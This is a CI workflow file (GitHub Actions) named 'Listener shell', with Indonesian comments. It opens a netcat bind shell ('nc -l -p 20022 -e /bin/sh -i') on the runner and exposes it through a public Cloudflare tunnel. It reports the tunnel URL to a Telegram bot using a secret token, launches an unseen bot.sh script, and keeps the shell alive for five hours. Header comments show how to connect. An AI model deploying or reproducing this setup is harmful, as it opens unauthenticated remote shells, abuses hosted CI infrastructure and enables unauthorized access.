name: Listener shell
# host: ./cloudflared access tcp --hostname https://geological-buyers-testing-fifty.trycloudflare.com --url localhost:20023
# host: nc localhost 20023


on:
  push:
    branches: [listen-nc]
  pull_request:
    branches: [listen-nc]


jobs:
  build:
    runs-on: ubuntu-latest
    container: ubuntu:16.04

    steps:
      - name: Install dependencies
        run: |
          apt-get update
          DEBIAN_FRONTEND=noninteractive apt-get install -y build-essential bc bison flex libssl-dev libelf-dev libncurses-dev dwarves rsync git fakeroot dpkg-dev python3 perl kmod cpio wget busybox-static netcat-openbsd curl


      - name: Buka tunnel ke web UI
        env:
          CHAT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          CHAT_ID: "7797309176"

        run: |
          curl -L -o cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
          chmod +x cloudflared
          nohup ./cloudflared tunnel --no-autoupdate --url tcp://127.0.0.1:20022 > tunnel.log 2>&1 &

          URL=""
          for i in $(seq 1 30); do
            URL=$(grep -o 'https://[a-z0-9-]*\.trycloudflare\.com' tunnel.log | head -1)
            [ -n "$URL" ] && break
            sleep 2
          done

          if [ -n "$URL" ]; then
            MSG="NC Listener: $URL"
          else
            MSG="GAGAL listener publik url"
          fi

          curl -s "https://api.telegram.org/bot$CHAT_TOKEN/sendMessage" \
            -d chat_id="$CHAT_ID" --data-urlencode text="$MSG" > /dev/null

          chmod +x ./bot.sh
          nohup ./bot.sh "$CHAT_TOKEN" "$CHAT_ID" > ~/bot.log 2>&1 &





      - name: Run nc listener
        run: |
          set -o pipefail

          {
            busybox nc -l -p 20022 -e /bin/sh -i &

            sleep 18000 # 5jam

          } 2>&1 | tee -a ~/mylog.txt


      - name: Collect artifacts
        run: |
          mkdir -p output

          cp ~/mylog.txt output/

          tar czvf result.tar.gz \
            -C output .

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: result
          path: result.tar.gz
